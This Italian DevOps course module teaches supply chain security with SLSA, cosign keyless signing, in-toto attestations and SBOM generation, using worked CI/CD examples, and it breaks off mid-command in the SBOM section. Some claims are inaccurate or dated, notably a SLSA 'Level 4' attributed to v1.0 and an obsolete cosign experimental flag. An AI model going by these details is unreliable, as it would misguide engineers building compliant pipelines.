---
corso: "Gestione Piattaforme e DevOps"
fase: "6 — Sicurezza e Compliance"
modulo: 20
titolo: "Supply Chain Security — SLSA + cosign + SBOM"
versione: "SLSA v1.0; cosign 2.x; syft 1.x; CycloneDX 1.6; in-toto 1.0; Notary v2; TUF 1.0"
livello: "Avanzato"
prerequisiti: ["07-ci-cd", "13-sicurezza-piattaforme", "15-secrets-management"]
obiettivi:
  - "Implementare i livelli SLSA 1-4 in una pipeline CI/CD esistente"
  - "Firmare e verificare container image con cosign e keyless signing (sigstore)"
  - "Generare e validare SBOM in formato CycloneDX e SPDX con syft e grype"
  - "Configurare admission control in Kubernetes per bloccare immagini non firmate"
  - "Progettare una strategia di supply chain security end-to-end con attestazioni in-toto"
tag: [supply-chain, slsa, cosign, sbom, sigstore, cyclonedx, spdx, in-toto, provenance]
---

# Supply Chain Security — SLSA + cosign + SBOM

> **Modulo 20** · **Aggiornamento:** 2026-05-24
> **Versioni:** SLSA v1.0; cosign 2.x; syft 1.x; CycloneDX 1.6; in-toto 1.0; Notary v2; TUF 1.0.

> **Obiettivi di apprendimento**
>
> Al completamento di questo modulo sarai in grado di:
> 1. Implementare i livelli SLSA 1-4 in una pipeline CI/CD esistente.
> 2. Firmare e verificare container image con cosign e keyless signing (sigstore).
> 3. Generare e validare SBOM in formato CycloneDX e SPDX con syft e grype.
> 4. Configurare admission control in Kubernetes per bloccare immagini non firmate.
> 5. Progettare una strategia di supply chain security end-to-end con attestazioni in-toto.

---

## Sommario

1. [Idee guida](#idee-guida)
2. [Fondamenti della software supply chain](#fondamenti-della-software-supply-chain)
3. [Framework SLSA — Livelli 1-4](#framework-slsa--livelli-1-4)
4. [Build provenance](#build-provenance)
5. [Attestazioni in-toto](#attestazioni-in-toto)
6. [Ecosistema sigstore](#ecosistema-sigstore)
7. [Firma di immagini container con cosign](#firma-di-immagini-container-con-cosign)
8. [Generazione SBOM](#generazione-sbom)
9. [Analisi SBOM](#analisi-sbom)
10. [Vulnerability scanning in CI/CD](#vulnerability-scanning-in-cicd)
11. [Verifica degli artefatti](#verifica-degli-artefatti)
12. [OCI artifacts e distribuzione](#oci-artifacts-e-distribuzione)
13. [Notary v2](#notary-v2)
14. [TUF — The Update Framework](#tuf--the-update-framework)
15. [Analisi di attacchi alla supply chain](#analisi-di-attacchi-alla-supply-chain)
16. [Policy engine — OPA/Gatekeeper per admission control](#policy-engine--opagatekeeper-per-admission-control)
17. [Architettura end-to-end di una pipeline sicura](#architettura-end-to-end-di-una-pipeline-sicura)
18. [Esercizi](#esercizi)
19. [Troubleshooting — 20 problemi comuni](#troubleshooting--20-problemi-comuni)
20. [FAQ — 20 domande e risposte](#faq--20-domande-e-risposte)
21. [Letture](#letture)
22. [Glossario](#glossario)
23. [Gitsign — Firma keyless dei commit Git](#gitsign--firma-keyless-dei-commit-git)
24. [Sicurezza di GitHub Actions](#sicurezza-di-github-actions)
25. [Gestione delle dipendenze e sicurezza](#gestione-delle-dipendenze-e-sicurezza)
26. [Attacchi alla supply chain npm e PyPI — Analisi approfondita](#attacchi-alla-supply-chain-npm-e-pypi--analisi-approfondita)
27. [Build riproducibili](#build-riproducibili)
28. [Vulnerability disclosure e risposta](#vulnerability-disclosure-e-risposta)
29. [Verifica della build provenance — Approfondimento](#verifica-della-build-provenance--approfondimento)

---

## Idee guida

1. **SLSA = framework livelli 1-4 di supply-chain integrity.** Target Level 2 minimo per produzione, Level 3 per workload critici.
2. **cosign keyless via OIDC: no chiavi long-lived.** L'identità del builder è attestata dal provider OIDC, non da una chiave PGP/SSH statica.
3. **SBOM CycloneDX/SPDX standard.** syft genera SBOM da image, filesystem o repository. CycloneDX 1.6 è il formato preferito per la ricchezza dei metadati.
4. **Attestation chain: build → sign → store → verify.** Ogni anello spezzato invalida la catena.
5. **Defense in depth: nessun singolo controllo è sufficiente.** SLSA + firma + SBOM + scan + policy = postura completa.
6. **Transparency log immutabile (Rekor) = non-repudiation.** Ogni firma viene registrata permanentemente.
7. **Automazione > processi manuali.** Ogni verifica deve essere automatizzata nella pipeline CI/CD.

---

## Fondamenti della software supply chain

### Cos'è la software supply chain

La software supply chain comprende tutto ciò che contribuisce alla produzione, distribuzione e esecuzione di un artefatto software:

- **Codice sorgente:** repository, branch, commit, review.
- **Dipendenze:** librerie dirette e transitive, package manager, registry.
- **Build system:** compilatore, linker, build tool, CI/CD runner.
- **Artefatti:** binari, container image, pacchetti, archivi.
- **Distribuzione:** registry, CDN, mirror, update channel.
- **Runtime:** orchestratore, host, configurazione di deploy.

### Superficie d'attacco

Ogni componente della catena può essere compromesso:

```
Sviluppatore → Repository → CI/CD → Build → Registry → Deploy → Runtime
     ↑              ↑          ↑        ↑         ↑          ↑
   Credenziali   Commit     Runner   Dipendenze  Pull     Config
   compromesse   injection  takeover  malicious   MITM     drift
```

### Principi di sicurezza della supply chain

| Principio | Descrizione |
|---|---|
| **Least privilege** | Ogni componente ha solo i permessi minimi necessari. |
| **Separation of duties** | Chi scrive il codice non controlla il build system. |
| **Immutability** | Artefatti firmati e immutabili dopo la produzione. |
| **Transparency** | Log pubblici e verificabili di ogni operazione. |
| **Verification at every step** | Ogni transizione tra componenti include una verifica crittografica. |
| **Reproducibility** | Lo stesso input produce lo stesso output, build dopo build. |

### Threat model STRIDE applicato alla supply chain

| Minaccia | Esempio supply chain |
|---|---|
| **Spoofing** | Attaccante impersona un maintainer su npm. |
| **Tampering** | Modifica del codice sorgente dopo il commit review. |
| **Repudiation** | Build non firmato, impossibile provare chi ha prodotto l'artefatto. |
| **Information Disclosure** | Secret esposti nei build log o nei layer dell'immagine. |
| **Denial of Service** | Typosquatting su package name → dependency confusion. |
| **Elevation of Privilege** | CI runner compromesso con accesso a secret di produzione. |

### Maturità della supply chain security

```
Livello 0: Nessun controllo
  → Build locali, no firma, no SBOM
Livello 1: Base
  → Build automatizzati, SBOM generato, scan vulnerability
Livello 2: Verificato
  → Provenance firmata, SBOM allegato, policy di ammissione
Livello 3: Attestato
  → Build isolato, attestazioni in-toto, transparency log
Livello 4: Completo
  → Build hermetico, riproducibile, two-party review, policy engine
```

---

## Framework SLSA — Livelli 1-4

### Panoramica SLSA

SLSA (Supply-chain Levels for Software Artifacts, pronunciato "salsa") è un framework di sicurezza che definisce requisiti incrementali per la protezione degli artefatti software. Sviluppato originariamente da Google, è ora un progetto della Open Source Security Foundation (OpenSSF).

### Specifica SLSA v1.0

SLSA v1.0 ha semplificato la struttura rispetto alle versioni precedenti, focalizzandosi su due track principali:

1. **Build Track:** Come l'artefatto è stato prodotto.
2. **Source Track:** Come il codice sorgente è stato gestito (in sviluppo, non ancora finalizzato in v1.0).

### Livello 1 — Provenance exists

**Requisiti:**

- Il build è definito in uno script o configurazione (non manuale).
- La provenance (informazioni sull'origine del build) è generata.
- La provenance descrive come l'artefatto è stato prodotto.

**Cosa protegge:** Fornisce visibilità base. Non garantisce integrità ma è il primo passo.

**Implementazione minima:**

```yaml
# GitHub Actions — SLSA Level 1
name: build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: |
          docker build -t myapp:${{ github.sha }} .
      - name: Generate provenance
        run: |
          cat > provenance.json <<EOF
          {
            "builder": "github-actions",
            "buildType": "docker",
            "invocation": {
              "configSource": {
                "uri": "${{ github.server_url }}/${{ github.repository }}",
                "digest": {"sha1": "${{ github.sha }}"},
                "entryPoint": ".github/workflows/build.yml"
              }
            },
            "materials": [
              {
                "uri": "git+${{ github.server_url }}/${{ github.repository }}",
                "digest": {"sha1": "${{ github.sha }}"}
              }
            ]
          }
          EOF
```

### Livello 2 — Hosted build platform

**Requisiti aggiuntivi rispetto a Level 1:**

- Il build avviene su una piattaforma hosted (non sulla macchina dello sviluppatore).
- La provenance è generata dalla piattaforma di build, non dallo script utente.
- La provenance è autenticata (firmata) dalla piattaforma.

**Cosa protegge:** Impedisce la manomissione locale del build. La provenance firmata dalla piattaforma è affidabile.

**Implementazione con SLSA GitHub Generator:**

```yaml
# GitHub Actions — SLSA Level 2 con generator ufficiale
name: slsa-build
on:
  push:
    tags: ['v*']

permissions:
  id-token: write    # per OIDC
  contents: read
  actions: read

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.hash.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - name: Build artifact
        run: |
          go build -o myapp-linux-amd64
      - name: Generate hash
        id: hash
        run: |
          DIGEST=$(sha256sum myapp-linux-amd64 | cut -d' ' -f1)
          echo "digest=sha256:${DIGEST}" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@v4
        with:
          name: myapp-linux-amd64
          path: myapp-linux-amd64

  provenance:
    needs: build
    permissions:
      id-token: write
      contents: write
      actions: read
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.1.0
    with:
      base64-subjects: ${{ needs.build.outputs.digest }}
      upload-assets: true
```

### Livello 3 — Hardened builds

**Requisiti aggiuntivi rispetto a Level 2:**

- La piattaforma di build garantisce che la provenance non possa essere falsificata dai job utente.
- I build sono isolati tra loro (un job non può influenzare un altro).
- La provenance include informazioni dettagliate sui materiali di input.

**Cosa protegge:** Anche un insider con accesso al CI/CD non può falsificare la provenance.

**Caratteristiche chiave:**

```
Build isolation:
├── Ogni build in VM/container ephemeral dedicato
├── Nessuna cache condivisa tra build di diversi progetti
├── Network access controllato e limitato
├── Filesystem read-only tranne working directory
└── Nessun accesso a secret di altri job

Non-falsifiable provenance:
├── Generata dalla piattaforma, non dal codice utente
├── Firmata con chiave controllata dalla piattaforma
├── Include digest di tutti gli input (source, deps, builder)
└── Non modificabile dopo la generazione
```

**GitHub Actions e SLSA Level 3:**

GitHub Actions può raggiungere SLSA Level 3 tramite il SLSA GitHub Generator, che utilizza reusable workflows per garantire l'isolamento della generazione di provenance dal job utente.

### Livello 4 — Hermetic and reproducible builds

**Requisiti aggiuntivi rispetto a Level 3:**

- Build hermetico: tutte le dipendenze sono dichiarate e fissate. Nessun accesso alla rete durante il build.
- Build riproducibile: dati gli stessi input, il build produce output identico bit-per-bit.
- Two-party source review: ogni commit richiede approvazione di due persone diverse.

**Cosa protegge:** Il massimo livello di garanzia. Elimina la possibilità di introdurre dipendenze nascoste o codice non revisionato.

**Requisiti per build hermetico:**

```yaml
# Bazel — build hermetico
build --experimental_strict_action_env
build --sandbox_default_allow_network=false
build --incompatible_strict_action_env
build --noremote_accept_cached

# Tutte le dipendenze devono essere dichiarate in WORKSPACE o MODULE.bazel
# Nessun download implicito durante il build
```

**Confronto tra livelli:**

| Aspetto | L1 | L2 | L3 | L4 |
|---|---|---|---|---|
| Build scriptato | ✅ | ✅ | ✅ | ✅ |
| Hosted build | ❌ | ✅ | ✅ | ✅ |
| Provenance firmata | ❌ | ✅ | ✅ | ✅ |
| Non-falsifiable | ❌ | ❌ | ✅ | ✅ |
| Build isolato | ❌ | ❌ | ✅ | ✅ |
| Hermetico | ❌ | ❌ | ❌ | ✅ |
| Riproducibile | ❌ | ❌ | ❌ | ✅ |
| Two-party review | ❌ | ❌ | ❌ | ✅ |

### Roadmap di adozione SLSA

```
Mese 1-2: Level 1
  → Automatizzare tutti i build
  → Generare provenance base
  → Documentare il processo di build

Mese 3-4: Level 2
  → Migrare a hosted build (GitHub Actions, Cloud Build)
  → Integrare SLSA GitHub Generator
  → Firmare provenance via OIDC

Mese 5-8: Level 3
  → Abilitare build isolation
  → Verificare non-falsifiability della provenance
  → Audit della configurazione CI/CD

Mese 9-12+: Level 4
  → Implementare build hermetici (Bazel, Nix)
  → Verificare riproducibilità
  → Richiedere two-party review su tutti i commit
```

---

## Build provenance

### Cos'è la build provenance

La build provenance è un documento che descrive come un artefatto è stato prodotto. Include:

- **Builder:** chi o cosa ha eseguito il build.
- **Source:** da quale repository e commit.
- **Build configuration:** quale workflow/script.
- **Materials:** dipendenze e input utilizzati.
- **Output:** hash dell'artefatto prodotto.

### Formato della provenance SLSA

La provenance SLSA segue il formato in-toto Statement, con predicato di tipo `https://slsa.dev/provenance/v1`:

```json
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {
      "name": "myapp-linux-amd64",
      "digest": {
        "sha256": "abc123def456..."
      }
    }
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v2",
      "externalParameters": {
        "workflow": {
          "ref": "refs/tags/v1.0.0",
          "repository": "https://github.com/org/repo",
          "path": ".github/workflows/release.yml"
        }
      },
      "internalParameters": {
        "github": {
          "event_name": "push",
          "runner_environment": "github-hosted"
        }
      },
      "resolvedDependencies": [
        {
          "uri": "git+https://github.com/org/repo@refs/tags/v1.0.0",
          "digest": {
            "gitCommit": "abc123..."
          }
        }
      ]
    },
    "runDetails": {
      "builder": {
        "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.1.0"
      },
      "metadata": {
        "invocationId": "https://github.com/org/repo/actions/runs/12345",
        "startedOn": "2026-05-22T10:00:00Z",
        "finishedOn": "2026-05-22T10:05:00Z"
      }
    }
  }
}
```

### Generare provenance con Google Cloud Build

```yaml
# cloudbuild.yaml con provenance automatica
steps:
  - name: 'gcr.io/cloud-builders/docker'
    args: ['build', '-t', 'us-docker.pkg.dev/$PROJECT_ID/repo/myapp:$COMMIT_SHA', '.']

images:
  - 'us-docker.pkg.dev/$PROJECT_ID/repo/myapp:$COMMIT_SHA'

options:
  requestedVerifyOption: VERIFIED
  # Cloud Build genera provenance automaticamente
  # Verificabile con: gcloud artifacts docker images describe
```

### Verifica della provenance

```bash
# Verifica provenance SLSA con slsa-verifier
slsa-verifier verify-artifact myapp-linux-amd64 \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/org/repo \
  --source-tag v1.0.0

# Verifica provenance di container image
slsa-verifier verify-image \
  us-docker.pkg.dev/project/repo/myapp@sha256:abc123... \
  --source-uri github.com/org/repo \
  --source-tag v1.0.0

# Output atteso
# Verified signature against tlog entry index 12345 at URL: https://rekor.sigstore.dev
# Verified build using builder "https://github.com/slsa-framework/..."
# PASSED: Verified SLSA provenance
```

---

## Attestazioni in-toto

### Framework in-toto

in-toto è un framework per proteggere l'integrità dell'intera supply chain software. Definisce un modello in cui:

- Un **project owner** definisce un **layout**: la sequenza di passi che la supply chain deve seguire.
- Ogni **functionary** (persona o sistema) esegue uno o più **step** e produce **link metadata** firmati.
- Un **verificatore** controlla che tutti gli step siano stati eseguiti correttamente, nell'ordine giusto, dai functionary autorizzati.

### Struttura di un'attestazione in-toto

```json
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {
      "name": "myapp:v1.0.0",
      "digest": {
        "sha256": "a1b2c3d4e5f6..."
      }
    }
  ],
  "predicateType": "https://example.com/custom-predicate/v1",
  "predicate": {
    "scanner": "trivy",
    "scannerVersion": "0.52.0",
    "scanDate": "2026-05-22T10:00:00Z",
    "vulnerabilities": {
      "critical": 0,
      "high": 0,
      "medium": 3,
      "low": 12
    },
    "result": "PASS"
  }
}
```

### Tipi di predicato comuni

| Predicato | URI | Contenuto |
|---|---|---|
| **SLSA Provenance** | `https://slsa.dev/provenance/v1` | Metadati di build |
| **SPDX** | `https://spdx.dev/Document/v2.3` | SBOM formato SPDX |
| **CycloneDX** | `https://cyclonedx.org/bom/v1.6` | SBOM formato CycloneDX |
| **Vulnerability scan** | `https://cosign.sigstore.dev/attestation/vuln/v1` | Risultati scan |
| **Custom** | URI personalizzato | Qualsiasi dato strutturato |

### Creare e allegare attestazioni con cosign

```bash
# Creare un'attestazione di vulnerability scan
trivy image --format cosign-vuln \
  --output vuln-attestation.json \
  myregistry.io/myapp:v1.0.0

# Firmare e allegare l'attestazione all'immagine
cosign attest --predicate vuln-attestation.json \
  --type vuln \
  myregistry.io/myapp:v1.0.0

# Creare un'attestazione custom
cat > custom-attestation.json <<EOF
{
  "approver": "security-team",
  "approvalDate": "2026-05-22",
  "complianceChecks": ["SOC2", "HIPAA"],
  "result": "approved"
}
EOF

cosign attest --predicate custom-attestation.json \
  --type custom \
  myregistry.io/myapp:v1.0.0

# Verificare attestazioni
cosign verify-attestation \
  --type vuln \
  --certificate-identity-regexp '.*@myorg\.com' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  myregistry.io/myapp:v1.0.0
```

### in-toto layout per pipeline completa

```python
# Definizione layout in-toto (semplificata)
layout = {
    "_type": "layout",
    "expires": "2027-01-01T00:00:00Z",
    "keys": {
        "ci-system-key-id": {...},
        "security-scanner-key-id": {...}
    },
    "steps": [
        {
            "name": "clone",
            "expected_command": ["git", "clone", "..."],
            "pubkeys": ["ci-system-key-id"],
            "expected_materials": [],
            "expected_products": [["CREATE", "src/*"]]
        },
        {
            "name": "build",
            "expected_command": ["docker", "build", "..."],
            "pubkeys": ["ci-system-key-id"],
            "expected_materials": [["MATCH", "src/*", "WITH", "PRODUCTS", "FROM", "clone"]],
            "expected_products": [["CREATE", "image.tar"]]
        },
        {
            "name": "scan",
            "expected_command": ["trivy", "image", "..."],
            "pubkeys": ["security-scanner-key-id"],
            "expected_materials": [["MATCH", "image.tar", "WITH", "PRODUCTS", "FROM", "build"]],
            "expected_products": [["CREATE", "scan-report.json"]]
        }
    ],
    "inspect": [
        {
            "name": "no-critical-vulns",
            "expected_materials": [["MATCH", "scan-report.json", "WITH", "PRODUCTS", "FROM", "scan"]],
            "run": ["python", "check_no_critical.py"]
        }
    ]
}
```

---

## Ecosistema sigstore

### Componenti di sigstore

sigstore è un ecosistema open source per la firma e la verifica di artefatti software. Si compone di tre servizi principali:

```
┌─────────────────────────────────────────────────────┐
│                    SIGSTORE                         │
│                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │  Fulcio   │  │  Rekor   │  │     cosign       │  │
│  │  (CA)     │  │  (Log)   │  │   (CLI client)   │  │
│  └────┬─────┘  └────┬─────┘  └────────┬─────────┘  │
│       │              │                  │            │
│  Emette cert    Registra firma     Firma/Verifica   │
│  short-lived    nel transparency   artefatti         │
│  basati su      log immutabile                      │
│  OIDC                                               │
└─────────────────────────────────────────────────────┘
```

### Fulcio — Certificate Authority

Fulcio è la Certificate Authority (CA) di sigstore. Emette certificati X.509 short-lived basati su token OIDC:

- L'utente si autentica tramite OIDC (Google, GitHub, Microsoft).
- Fulcio verifica il token OIDC ed emette un certificato con validità di ~10 minuti.
- Il certificato contiene l'identità OIDC (email, workflow URI) nel campo SAN.
- Non servono chiavi long-lived: il certificato scade rapidamente.

**Flusso Fulcio:**

```
1. Utente chiede certificato a Fulcio
2. Fulcio risponde con challenge
3. Utente firma challenge con chiave ephemeral
4. Utente invia: challenge firmato + token OIDC + chiave pubblica
5. Fulcio verifica token OIDC
6. Fulcio emette certificato X.509 short-lived
7. Certificato contiene: identità OIDC + chiave pubblica
8. Certificato registrato nel Certificate Transparency Log
```

### Rekor — Transparency Log

Rekor è il transparency log di sigstore. Basato su Merkle tree, fornisce un registro immutabile e pubblico di tutte le firme:

- Ogni firma viene registrata con timestamp, certificato e hash dell'artefatto.
- Una volta registrata, l'entry non può essere modificata o cancellata.
- Chiunque può verificare che una firma esiste nel log.
- Fornisce non-repudiation: il firmatario non può negare di aver firmato.

```bash
# Cercare entry nel transparency log
rekor-cli search --sha sha256:abc123def456...

# Ottenere dettagli di un'entry
rekor-cli get --log-index 12345678

# Verificare la consistenza del log
rekor-cli verify --artifact myapp-linux-amd64 \
  --signature myapp-linux-amd64.sig \
  --pki-format x509 \
  --public-key cosign.pub
```

### cosign — Il tool di firma

cosign è il client CLI principale di sigstore. Supporta:

- Firma keyless (OIDC) e con chiave.
- Firma di container image, blob, e OCI artifacts.
- Attestazioni in-toto.
- Integrazione con transparency log.
- Verifica di firme e attestazioni.

**Modalità di firma:**

```bash
# 1. Keyless (OIDC) — raccomandato
cosign sign myregistry.io/myapp:v1.0.0
# Apre browser per autenticazione OIDC
# Firma registrata in Rekor automaticamente

# 2. Keyless in CI/CD (ambient credentials)
# In GitHub Actions con id-token: write
cosign sign myregistry.io/myapp:v1.0.0
# Usa OIDC token di GitHub Actions automaticamente

# 3. Con chiave KMS
cosign generate-key-pair --kms awskms:///arn:aws:kms:eu-west-1:123456:key/abcdef
cosign sign --key awskms:///arn:aws:kms:eu-west-1:123456:key/abcdef \
  myregistry.io/myapp:v1.0.0

# 4. Con chiave locale (sconsigliato per produzione)
cosign generate-key-pair
cosign sign --key cosign.key myregistry.io/myapp:v1.0.0
```

---

## Firma di immagini container con cosign

### Firma keyless in GitHub Actions

```yaml
name: sign-image
on:
  push:
    tags: ['v*']

permissions:
  packages: write
  id-token: write   # per OIDC token

jobs:
  build-sign:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: build
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}

      - name: Install cosign
        uses: sigstore/cosign-installer@v3

      - name: Sign image (keyless)
        env:
          COSIGN_EXPERIMENTAL: "true"
        run: |
          cosign sign --yes \
            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}

      - name: Verify signature
        run: |
          cosign verify \
            --certificate-identity-regexp 'https://github.com/${{ github.repository }}' \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
```

### Firma con chiave KMS

```bash
# Generare key pair su AWS KMS
cosign generate-key-pair --kms awskms:///arn:aws:kms:eu-west-1:123456789:key/mrk-abc123

# Firmare con KMS
cosign sign --key awskms:///arn:aws:kms:eu-west-1:123456789:key/mrk-abc123 \
  --tlog-upload=true \
  myregistry.io/myapp@sha256:abc123...

# Firmare con Azure Key Vault
cosign sign --key azurekms://vault-name.vault.azure.net/keys/cosign-key \
  myregistry.io/myapp@sha256:abc123...

# Firmare con Google Cloud KMS
cosign sign --key gcpkms://projects/myproj/locations/global/keyRings/ring/cryptoKeys/key \
  myregistry.io/myapp@sha256:abc123...

# Firmare con HashiCorp Vault
cosign sign --key hashivault://transit/keys/cosign-key \
  myregistry.io/myapp@sha256:abc123...
```

### Verificare firme di immagini

```bash
# Verifica keyless — specificare identità e issuer
cosign verify \
  --certificate-identity "https://github.com/org/repo/.github/workflows/release.yml@refs/tags/v1.0.0" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp@sha256:abc123...

# Verifica con regexp sull'identità
cosign verify \
  --certificate-identity-regexp "https://github.com/org/.*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp@sha256:abc123...

# Verifica con chiave pubblica
cosign verify --key cosign.pub myregistry.io/myapp@sha256:abc123...

# Verifica con KMS
cosign verify --key awskms:///arn:aws:kms:eu-west-1:123456789:key/mrk-abc123 \
  myregistry.io/myapp@sha256:abc123...

# Output JSON strutturato
cosign verify --output json \
  --certificate-identity-regexp ".*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp@sha256:abc123... | jq .
```

### Aggiungere annotazioni alle firme

```bash
# Firmare con metadati aggiuntivi
cosign sign --key cosign.key \
  -a "team=platform" \
  -a "environment=production" \
  -a "approver=security-lead" \
  -a "scan-result=clean" \
  myregistry.io/myapp@sha256:abc123...

# Verificare con filtro su annotazioni
cosign verify --key cosign.pub \
  -a "environment=production" \
  -a "scan-result=clean" \
  myregistry.io/myapp@sha256:abc123...
```

---

## Generazione SBOM

### Cos'è un SBOM

Un Software Bill of Materials (SBOM) è un inventario completo di tutti i componenti software presenti in un artefatto. Include:

- Nome e versione di ogni dipendenza.
- Licenza di ogni componente.
- Hash crittografici per verifica integrità.
- Relazioni tra componenti (dipendenze dirette vs transitive).
- Vulnerabilità note (opzionale, tramite arricchimento).

### Formati SBOM

| Formato | Standard | Uso principale |
|---|---|---|
| **CycloneDX** | OWASP | Security-focused, ricco di metadati, supporta VEX |
| **SPDX** | Linux Foundation | License compliance, ampio supporto |
| **SWID** | ISO/IEC 19770-2 | Software asset management |

### Generazione SBOM con syft

```bash
# SBOM da container image
syft packages myregistry.io/myapp:v1.0.0 -o cyclonedx-json > sbom.cdx.json

# SBOM da directory di progetto
syft dir:./src -o cyclonedx-json > sbom-source.cdx.json

# SBOM da filesystem
syft dir:/ -o spdx-json > sbom-filesystem.spdx.json

# SBOM da archivio tar
syft file:myapp.tar -o cyclonedx-json > sbom.cdx.json

# SBOM con cataloger specifici
syft packages myregistry.io/myapp:v1.0.0 \
  --catalogers python,javascript,go \
  -o cyclonedx-json > sbom.cdx.json

# Output in formati multipli
syft packages myregistry.io/myapp:v1.0.0 -o cyclonedx-json=sbom.cdx.json -o spdx-json=sbom.spdx.json

# SBOM con informazioni sulla licenza
syft packages myregistry.io/myapp:v1.0.0 \
  -o cyclonedx-json \
  --file sbom.cdx.json
```

### Generazione SBOM con trivy

```bash
# SBOM da immagine container in formato CycloneDX
trivy image --format cyclonedx \
  --output sbom.cdx.json \
  myregistry.io/myapp:v1.0.0

# SBOM in formato SPDX
trivy image --format spdx-json \
  --output sbom.spdx.json \
  myregistry.io/myapp:v1.0.0

# SBOM da filesystem
trivy fs --format cyclonedx \
  --output sbom.cdx.json \
  ./project
```

### Generazione SBOM specifica per linguaggio

```bash
# Python — cyclonedx-py
pip install cyclonedx-bom
cyclonedx-py requirements \
  --input-file requirements.txt \
  --output-file sbom.cdx.json \
  --format json

# Node.js — @cyclonedx/cyclonedx-npm
npx @cyclonedx/cyclonedx-npm \
  --output-file sbom.cdx.json \
  --output-format json

# Go — cyclonedx-gomod
cyclonedx-gomod mod -json -output sbom.cdx.json

# Java/Maven
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom

# .NET
dotnet CycloneDX . --json --output sbom.cdx.json
```

### Allegare SBOM a immagine container

```bash
# Allegare SBOM come attestazione cosign
cosign attest --predicate sbom.cdx.json \
  --type cyclonedx \
  myregistry.io/myapp@sha256:abc123...

# Allegare SBOM come OCI artifact con ORAS
oras attach myregistry.io/myapp:v1.0.0 \
  --artifact-type application/vnd.cyclonedx+json \
  sbom.cdx.json:application/vnd.cyclonedx+json

# Allegare SBOM con syft + cosign in un solo step
syft attest --output cyclonedx-json \
  myregistry.io/myapp@sha256:abc123... > sbom-attestation.json
cosign attest --predicate sbom-attestation.json \
  --type cyclonedx \
  myregistry.io/myapp@sha256:abc123...
```

### SBOM nella pipeline CI/CD

```yaml
# GitHub Actions — SBOM generation completa
name: sbom
on:
  push:
    tags: ['v*']

permissions:
  packages: write
  id-token: write

jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build and push image
        id: build
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}

      - name: Install syft
        uses: anchore/sbom-action/download-syft@v0

      - name: Generate SBOM
        run: |
          syft packages \
            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }} \
            -o cyclonedx-json > sbom.cdx.json

      - name: Install cosign
        uses: sigstore/cosign-installer@v3

      - name: Attach SBOM as attestation
        run: |
          cosign attest --yes \
            --predicate sbom.cdx.json \
            --type cyclonedx \
            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}

      - name: Upload SBOM as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.cdx.json
```

---

## Analisi SBOM

### Strumenti di analisi SBOM

| Strumento | Funzione |
|---|---|
| **grype** | Vulnerability matching su SBOM |
| **bomber** | Analisi vulnerabilità su SBOM |
| **sbom-scorecard** | Valutazione qualità SBOM |
| **dependency-track** | Piattaforma di gestione SBOM e rischio continuo |
| **GUAC** | Graph for Understanding Artifact Composition |

### Analisi vulnerabilità da SBOM

```bash
# Scansione SBOM con grype
grype sbom:./sbom.cdx.json

# Output in formato tabella con severità minima
grype sbom:./sbom.cdx.json --fail-on critical -o table

# Output JSON per automazione
grype sbom:./sbom.cdx.json -o json > vuln-report.json

# Scansione SBOM con trivy
trivy sbom sbom.cdx.json --severity CRITICAL,HIGH
```

### Valutazione qualità SBOM

```bash
# sbom-scorecard
sbom-scorecard score sbom.cdx.json

# Verificare completezza
# Un SBOM di qualità deve includere:
# - Nome e versione di ogni componente
# - Licenze
# - Hash (SHA-256 minimo)
# - Relazioni di dipendenza
# - Supplier/author information
# - Pedigree (provenienza del componente)
```

### OWASP Dependency-Track

```yaml
# docker-compose.yml per Dependency-Track
services:
  api-server:
    image: dependencytrack/apiserver:4.11
    environment:
      - ALPINE_DATABASE_MODE=external
      - ALPINE_DATABASE_URL=jdbc:postgresql://postgres:5432/dtrack
      - ALPINE_DATABASE_DRIVER=org.postgresql.Driver
      - ALPINE_DATABASE_USERNAME=dtrack
      - ALPINE_DATABASE_PASSWORD=${DTRACK_DB_PASSWORD}
    ports:
      - "8081:8080"
    volumes:
      - dtrack-data:/data

  frontend:
    image: dependencytrack/frontend:4.11
    ports:
      - "8080:8080"
    environment:
      - API_BASE_URL=http://api-server:8080

  postgres:
    image: postgres:16-alpine
    environment:
      - POSTGRES_DB=dtrack
      - POSTGRES_USER=dtrack
      - POSTGRES_PASSWORD=${DTRACK_DB_PASSWORD}
    volumes:
      - postgres-data:/var/lib/postgresql/data

volumes:
  dtrack-data:
  postgres-data:
```

```bash
# Upload SBOM a Dependency-Track via API
curl -X POST "https://dtrack.example.com/api/v1/bom" \
  -H "X-Api-Key: ${DTRACK_API_KEY}" \
